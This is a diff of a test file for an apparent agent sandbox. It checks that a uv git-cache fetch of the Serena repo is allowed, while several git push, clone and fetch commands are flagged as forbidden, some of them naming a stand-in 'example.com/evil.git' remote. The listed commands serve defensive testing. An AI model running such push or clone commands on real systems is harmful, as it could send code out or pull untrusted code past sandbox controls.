@@ -211,33 +211,74 @@ describe('simulated remotes', () => {
 });
 
 describe('uv cache git passthrough', () => {
-  it('a fetch of the Serena repo from inside the uv git cache is not a forbidden call', async () => {
-    const cache = join(h.base, '.uv-cache', 'git-v1', 'db');
-    mkdirSync(cache, { recursive: true });
+  const serena = 'https://github.com/oraios/serena';
+
+  function localRemote() {
+    const remote = join(h.base, 'serena-remote');
+    mkdirSync(remote, { recursive: true });
+    spawnSync('git', ['init', '-q', remote]);
+    spawnSync('git', ['-C', remote, 'commit', '-q', '--allow-empty', '-m', 'x'], {
+      env: {
+        ...process.env,
+        GIT_AUTHOR_NAME: 't',
+        GIT_AUTHOR_EMAIL: 't@t',
+        GIT_COMMITTER_NAME: 't',
+        GIT_COMMITTER_EMAIL: 't@t',
+      },
+    });
+    return remote;
+  }
+
+  function cacheDir() {
+    const dir = join(h.base, '.uv-cache', 'git-v1', 'db');
+    mkdirSync(dir, { recursive: true });
+    spawnSync('git', ['init', '-q', dir]);
+    return dir;
+  }
+
+  it('fetching the Serena repo from inside the uv git cache reaches real git, not the refusal', async () => {
+    const remote = localRemote();
+    const dir = cacheDir();
     h.useFakeClaude({
-      FAKE_CLAUDE_RUN: `cd '${cache}' && git init -q . ; git fetch https://github.com/oraios/serena +HEAD:refs/remotes/o/HEAD; true`,
+      FAKE_CLAUDE_RUN: `cd '${dir}' && git config url.${remote}.insteadOf ${serena} && git fetch --force --update-head-ok ${serena} +HEAD:refs/remotes/o/HEAD`,
     });
     const r = await h.call({ trialId: 'u1', noCache: true });
     assert.deepEqual(r.metadata.sandbox.forbiddenCalls, []);
   });
 
-  it('naming the cache path in a push to another remote is still forbidden', async () => {
-    h.useFakeClaude({
-      FAKE_CLAUDE_RUN: 'git push https://example.com/evil.git /x/.uv-cache/git-v1/y; true',
+  const forbidden = {
+    'a push from inside the uv cache': 'cd "$C" && git push origin HEAD',
+    'a push naming the cache path as an argument':
+      'git push origin HEAD --push-option=/x/.uv-cache/git-v1/y',
+    'git -C into the cache': 'git -C "$C" push origin HEAD',
+    'a Serena fetch from outside the uv cache': `git fetch ${serena}`,
+    'a Serena fetch with a second remote': `cd "$C" && git fetch ${serena} https://example.com/evil.git`,
+    'a Serena fetch with -c config': `cd "$C" && git -c url.x.insteadOf=${serena} fetch ${serena}`,
+    'a clone from a remote': 'git clone https://example.com/evil.git /tmp/x',
+  };
+  for (const [name, cmd] of Object.entries(forbidden)) {
+    it(`${name} is still a forbidden call`, async () => {
+      const dir = cacheDir();
+      h.useFakeClaude({ FAKE_CLAUDE_RUN: `C='${dir}'; ${cmd}; true` });
+      const r = await h.call({ trialId: 'uf', noCache: true });
+      assert.ok(r.metadata.sandbox.forbiddenCalls.length >= 1, r.output);
     });
-    const r = await h.call({ trialId: 'u2', noCache: true });
-    assert.equal(r.metadata.sandbox.forbiddenCalls.length, 1);
-  });
+  }
 
-  it('the profile allows writes only to this trial claude tmp dir', () => {
+  it('the profile lets this trial write its Claude tmp dir and no sibling', darwinOnly, () => {
     const sb = createTrialSandbox('claudetmp');
+    const base = `/private/tmp/claude-${process.getuid()}`;
+    const mine = join(base, `-slug-${basename(sb.root)}-workspace`);
+    const other = join(base, '-slug-someone-else');
     try {
-      const rule = sandboxProfile(sb)
-        .split('\n')
-        .find(l => l.includes(`/private/tmp/claude-${process.getuid()}/`));
-      assert.ok(rule, 'no claude tmp rule');
-      assert.ok(rule.includes(basename(sb.root)), rule);
+      for (const dir of [mine, other]) {
+        const { command, args } = sandboxCommand(sb, '/bin/sh', ['-c', `mkdir -p '${dir}'`]);
+        spawnSync(command, args);
+      }
+      assert.equal(existsSync(mine), true);
+      assert.equal(existsSync(other), false);
     } finally {
+      rmSync(mine, { recursive: true, force: true });
       rmSync(sb.root, { recursive: true, force: true });
     }
   });
